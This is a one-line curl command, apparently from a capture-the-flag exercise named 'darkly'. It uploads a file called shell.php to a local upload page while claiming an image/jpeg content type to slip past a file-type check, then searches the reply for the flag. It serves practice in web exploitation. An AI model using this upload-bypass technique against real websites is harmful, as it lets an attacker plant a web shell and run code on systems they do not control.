curl -X POST -F "Upload=Upload" -F "uploaded=@/Users/celinejunker/darkly/flags/binary_upload/shell.php;type=image/jpeg" "http://localhost:8080/index.php?page=upload" | grep "The flag is"